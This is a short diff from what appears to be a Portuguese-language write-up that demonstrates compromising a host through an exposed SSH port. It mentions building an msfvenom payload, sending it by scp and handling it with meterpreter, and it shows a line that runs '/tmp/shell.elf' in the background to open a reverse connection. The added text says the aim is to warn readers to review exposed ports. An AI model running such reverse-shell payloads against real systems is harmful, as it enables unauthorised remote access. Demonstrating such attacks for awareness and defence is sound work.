@@ -46,3 +46,7 @@ que fiz com msfvenom, enviei usando o protocolo scp e abri pelo meterpreter com 
 🖥️ /tmp/shell.elf &
 
 // dando permissão e executando (pra criar a conexão)
+
+### objetivo
+
+o intuito aqui é mostrar como alguém pode fazer mal a você simplesmente por achar uma porta ssh (22) exposta, revise sua portas, mantenha segurança
